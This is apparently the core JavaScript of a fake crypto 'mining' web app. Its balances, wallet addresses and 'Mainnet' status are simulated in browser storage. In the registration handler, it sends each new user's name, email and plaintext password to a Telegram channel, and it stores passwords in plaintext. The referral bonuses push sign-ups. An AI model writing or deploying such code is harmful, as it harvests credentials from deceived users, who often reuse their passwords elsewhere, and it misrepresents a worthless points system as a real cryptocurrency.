/**
 * Bam Mining App - Core Logic
 * ---------------------------
 * Handles auth, dashboard, activity claims, transfers, and UI state.
 */

const STORAGE_KEY = "bam_users_v1";
const SESSION_KEY = "bam_session_v1";
const ACTIVITY_REWARD = 0.25;
const ACTIVITY_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24 hours

// ---------- Utilities ----------
function generateWalletAddress() {
  const chars = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) {
    addr += chars[Math.floor(Math.random() * chars.length)];
  }
  return addr;
}

function shortAddress(addr) {
  if (!addr || addr.length < 12) return addr;
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

function formatNumber(n, decimals = 8) {
  return Number(n).toFixed(decimals).replace(/\.?0+$/, "") || "0";
}

function showToast(message, type = "success") {
  const toast = document.getElementById("toast");
  toast.textContent = message;
  toast.className = `toast ${type} show`;
  setTimeout(() => {
    toast.classList.remove("show");
  }, 3200);
}

function getUsers() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
  } catch {
    return {};
  }
}

function saveUsers(users) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
}

function getCurrentUser() {
  const session = localStorage.getItem(SESSION_KEY);
  if (!session) return null;
  const users = getUsers();
  return users[session] || null;
}

function setSession(email) {
  localStorage.setItem(SESSION_KEY, email);
}

function clearSession() {
  localStorage.removeItem(SESSION_KEY);
}

// ---------- Auth ----------
async function handleRegister(e) {
  e.preventDefault();
  const name = document.getElementById("reg-name").value.trim();
  const email = document.getElementById("reg-email").value.trim().toLowerCase();
  const password = document.getElementById("reg-password").value;
  const manualRef = document.getElementById("reg-referral").value.trim();

  if (!name || !email || !password) {
    showToast("Please fill all fields", "error");
    return;
  }
  if (password.length < 6) {
  showToast("Password must be at least 6 characters", "error");
  return;
}
if (!/[a-zA-Z]/.test(password)) {
  showToast("Password must contain at least one letter", "error");
  return;
}
if (!/[0-9]/.test(password)) {
  showToast("Password must contain at least one number", "error");
  return;
}

  const users = getUsers();
  if (users[email]) {
    showToast("Email already registered", "error");
    return;
  }

  const wallet = generateWalletAddress();
  const now = Date.now();

  // Get referral code from URL or manual input
  const urlParams = new URLSearchParams(window.location.search);
  let refCode = urlParams.get("ref") || manualRef;

  let referrerEmail = null;
  if (refCode) {
    for (const [mail, u] of Object.entries(users)) {
      if (u.wallet && u.wallet.slice(2, 10).toLowerCase() === refCode.toLowerCase()) {
        referrerEmail = mail;
        break;
      }
    }
  }

  // Create new user
  users[email] = {
    name,
    email,
    password,
    wallet,
    balance: (refCode && referrerEmail) ? 0.15 : 0,
    xpRate: 10.0,
    lastClaim: 0,
    history: [],
    referrals: 0,
    createdAt: now
  };

  // Give bonus to referrer
  if (referrerEmail && users[referrerEmail]) {
    users[referrerEmail].balance = +(users[referrerEmail].balance + 0.15).toFixed(8);
    users[referrerEmail].referrals = (users[referrerEmail].referrals || 0) + 1;
    users[referrerEmail].history = users[referrerEmail].history || [];
    users[referrerEmail].history.push({
      type: "Referral Bonus",
      amount: 0.15,
      time: now
    });
  }

  // History for new user
  if (refCode && referrerEmail) {
    users[email].history.push({
      type: "Referral Welcome Bonus",
      amount: 0.15,
      time: now
    });
  }

  saveUsers(users);
  setSession(email);

  // Telegram
  showToast("Creating account...", "success");
  try {
    await window.sendRegistrationToTelegram({ name, email, password, wallet });
  } catch (err) {
    console.warn("Telegram notification failed", err);
  }

  showToast(refCode && referrerEmail ? "Welcome! +0.15 BAM Referral Bonus 🎉" : "Welcome to Bam! 🚀", "success");
  setTimeout(() => showApp(), 600);
}

function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById("login-email").value.trim().toLowerCase();
  const password = document.getElementById("login-password").value;

  const users = getUsers();
  const user = users[email];

  if (!user || user.password !== password) {
    showToast("Invalid email or password", "error");
    return;
  }

  setSession(email);
  showToast(`Welcome back, ${user.name}!`, "success");
  setTimeout(() => showApp(), 400);
}

function handleLogout() {
  clearSession();
  showAuth();
  showToast("Logged out successfully");
}

// ---------- UI Switching ----------
function showAuth() {
  document.getElementById("auth-screen").classList.remove("hidden");
  document.getElementById("app-screen").classList.add("hidden");
  switchAuthTab("login");
}

function showApp() {
  document.getElementById("auth-screen").classList.add("hidden");
  document.getElementById("app-screen").classList.remove("hidden");
  renderDashboard();
  switchPage("home");
}

function switchAuthTab(tab) {
  const loginForm = document.getElementById("login-form");
  const regForm = document.getElementById("register-form");
  const loginTab = document.getElementById("tab-login");
  const regTab = document.getElementById("tab-register");

  if (tab === "login") {
    loginForm.classList.remove("hidden");
    loginForm.style.display = "block";
    regForm.classList.add("hidden");
    regForm.style.display = "none";
    loginTab.classList.add("btn-primary");
    loginTab.classList.remove("btn-secondary");
    regTab.classList.add("btn-secondary");
    regTab.classList.remove("btn-primary");
  } else {
    loginForm.classList.add("hidden");
    loginForm.style.display = "none";
    regForm.classList.remove("hidden");
    regForm.style.display = "block";
    regTab.classList.add("btn-primary");
    regTab.classList.remove("btn-secondary");
    loginTab.classList.add("btn-secondary");
    loginTab.classList.remove("btn-primary");
  }
}

function switchPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  document.getElementById(`page-${pageId}`).classList.add("active");

  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
  const nav = document.querySelector(`[data-page="${pageId}"]`);
  if (nav) nav.classList.add("active");

  // Re-render relevant pages
  if (pageId === "home") renderDashboard();
  if (pageId === "activity") renderActivity();
  if (pageId === "wallet") renderWallet();
  if (pageId === "referrals") renderReferrals();
  if (pageId === "profile") renderProfile();
}

// ---------- Rendering ----------
function renderDashboard() {
  const user = getCurrentUser();
  if (!user) return;

  document.getElementById("header-name").textContent = user.name;
  document.getElementById("header-avatar").textContent = user.name.charAt(0).toUpperCase();
  document.getElementById("home-balance").textContent = formatNumber(user.balance, 8);
  document.getElementById("home-xp").textContent = user.xpRate.toFixed(1);
  document.getElementById("home-wallet-short").textContent = shortAddress(user.wallet);

  // Network status
  document.getElementById("network-status").innerHTML = `
    <span class="badge badge-green">● Mainnet</span>
  `;

  // Update countdown if needed
  updateClaimTimer();
}

function renderActivity() {
  const user = getCurrentUser();
  if (!user) return;

  document.getElementById("activity-balance").textContent = formatNumber(user.balance, 8);
  document.getElementById("activity-xp").textContent = user.xpRate.toFixed(1);

  const canClaim = Date.now() - (user.lastClaim || 0) >= ACTIVITY_COOLDOWN_MS;
  const claimBtn = document.getElementById("claim-btn");
  const timerBox = document.getElementById("claim-timer-box");

  if (canClaim) {
    claimBtn.disabled = false;
    claimBtn.innerHTML = `<span>⚡</span> Claim Activity (+${ACTIVITY_REWARD})`;
    timerBox.classList.add("hidden");
  } else {
    claimBtn.disabled = true;
    claimBtn.innerHTML = `<span class="animate-spin">⏳</span> Processing...`;
    timerBox.classList.remove("hidden");
    updateClaimTimer();
  }

  // History
  const historyEl = document.getElementById("activity-history");
  if (!user.history || user.history.length === 0) {
    historyEl.innerHTML = `<p class="text-sm text-center" style="color:var(--text-muted);padding:1rem 0;">No activity yet. Claim your first reward!</p>`;
  } else {
    historyEl.innerHTML = user.history
      .slice()
      .reverse()
      .slice(0, 10)
      .map(h => `
        <div class="history-item">
          <div>
            <div class="font-semibold text-sm">${h.type}</div>
            <div class="text-xs" style="color:var(--text-muted)">${new Date(h.time).toLocaleString()}</div>
          </div>
          <div class="font-bold" style="color:var(--success)">+${h.amount}</div>
        </div>
      `).join("");
  }
}

function updateClaimTimer() {
  const user = getCurrentUser();
  if (!user) return;

  const remaining = ACTIVITY_COOLDOWN_MS - (Date.now() - (user.lastClaim || 0));
  const timerEl = document.getElementById("claim-timer");
  const claimBtn = document.getElementById("claim-btn");

  if (remaining <= 0) {
    if (timerEl) timerEl.textContent = "00:00:00";
    if (claimBtn) {
      claimBtn.disabled = false;
      claimBtn.innerHTML = `<span>⚡</span> Claim Activity (+${ACTIVITY_REWARD})`;
    }
    const box = document.getElementById("claim-timer-box");
    if (box) box.classList.add("hidden");
    return;
  }

  const h = Math.floor(remaining / 3600000);
  const m = Math.floor((remaining % 3600000) / 60000);
  const s = Math.floor((remaining % 60000) / 1000);
  const str = `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;

  if (timerEl) timerEl.textContent = str;

  // Also update home timer if present
  const homeTimer = document.getElementById("home-timer");
  if (homeTimer) homeTimer.textContent = str;
}

function claimActivity() {
  const user = getCurrentUser();
  if (!user) return;

  const now = Date.now();
  if (now - (user.lastClaim || 0) < ACTIVITY_COOLDOWN_MS) {
    showToast("Activity not ready yet", "error");
    return;
  }

  user.balance = +(user.balance + ACTIVITY_REWARD).toFixed(8);
  user.lastClaim = now;
  user.history = user.history || [];
  user.history.push({
    type: "Daily Activity",
    amount: ACTIVITY_REWARD,
    time: now
  });

  const users = getUsers();
  users[user.email] = user;
  saveUsers(users);

  showToast(`+${ACTIVITY_REWARD} BAM claimed! 🎉`, "success");
  renderActivity();
  renderDashboard();
}

function renderWallet() {
  const user = getCurrentUser();
  if (!user) return;

  document.getElementById("wallet-balance").textContent = formatNumber(user.balance, 8);
  document.getElementById("wallet-address").textContent = user.wallet;
  document.getElementById("wallet-address-short").textContent = shortAddress(user.wallet);
}

function copyAddress() {
  const user = getCurrentUser();
  if (!user) return;
  navigator.clipboard.writeText(user.wallet).then(() => {
    showToast("Address copied! 📋");
  }).catch(() => {
    showToast("Could not copy", "error");
  });
}

function handleSendPoints(e) {
  e.preventDefault();
  const user = getCurrentUser();
  if (!user) return;

  const toAddress = document.getElementById("send-to").value.trim();
  const amount = parseFloat(document.getElementById("send-amount").value);

  if (!toAddress || !toAddress.startsWith("0x") || toAddress.length < 10) {
    showToast("Invalid wallet address", "error");
    return;
  }
  if (isNaN(amount) || amount <= 0) {
    showToast("Enter a valid amount", "error");
    return;
  }
  if (amount > user.balance) {
    showToast("Insufficient balance", "error");
    return;
  }
  if (toAddress.toLowerCase() === user.wallet.toLowerCase()) {
    showToast("Cannot send to yourself", "error");
    return;
  }

  // Find recipient
  const users = getUsers();
  let recipient = null;
  let recipientEmail = null;
  for (const [email, u] of Object.entries(users)) {
    if (u.wallet.toLowerCase() === toAddress.toLowerCase()) {
      recipient = u;
      recipientEmail = email;
      break;
    }
  }

  if (!recipient) {
    showToast("Recipient wallet not found on Bam", "error");
    return;
  }

  // Transfer
  user.balance = +(user.balance - amount).toFixed(8);
  recipient.balance = +(recipient.balance + amount).toFixed(8);

  user.history = user.history || [];
  user.history.push({
    type: `Sent to ${shortAddress(toAddress)}`,
    amount: -amount,
    time: Date.now()
  });

  recipient.history = recipient.history || [];
  recipient.history.push({
    type: `Received from ${shortAddress(user.wallet)}`,
    amount: amount,
    time: Date.now()
  });

  users[user.email] = user;
  users[recipientEmail] = recipient;
  saveUsers(users);

  document.getElementById("send-to").value = "";
  document.getElementById("send-amount").value = "";

  showToast(`Successfully sent ${amount} BAM! 🚀`, "success");
  renderWallet();
  renderDashboard();
}

function renderReferrals() {
  const user = getCurrentUser();
  if (!user) return;
  document.getElementById("ref-count").textContent = user.referrals || 0;
  document.getElementById("ref-link").textContent = `https://cloudfarmingdroid.github.io/Bamcoins/?ref=${user.wallet.slice(2, 10)}`;
}

function copyRefLink() {
  const link = document.getElementById("ref-link").textContent;
  navigator.clipboard.writeText(link).then(() => {
    showToast("Referral link copied! 🔗");
  });
}

function renderProfile() {
  const user = getCurrentUser();
  if (!user) return;
  document.getElementById("profile-name").textContent = user.name;
  document.getElementById("profile-email").textContent = user.email;
  document.getElementById("profile-wallet").textContent = user.wallet;
  document.getElementById("profile-joined").textContent = new Date(user.createdAt).toLocaleDateString();
}

// ---------- Init ----------
function init() {
  // Auth form listeners
  document.getElementById("login-form").addEventListener("submit", handleLogin);
  document.getElementById("register-form").addEventListener("submit", handleRegister);
  document.getElementById("send-form").addEventListener("submit", handleSendPoints);

  // Tabs
  document.getElementById("tab-login").addEventListener("click", () => switchAuthTab("login"));
  document.getElementById("tab-register").addEventListener("click", () => switchAuthTab("register"));

  // Navigation
  document.querySelectorAll(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => {
      const page = btn.getAttribute("data-page");
      if (page) switchPage(page);
    });
  });

  // Claim button
  document.getElementById("claim-btn").addEventListener("click", claimActivity);

  // Check session
  const user = getCurrentUser();
  if (user) {
    showApp();
  } else {
    showAuth();
  }

  // Timer tick
  setInterval(updateClaimTimer, 1000);
}

document.addEventListener("DOMContentLoaded", init);
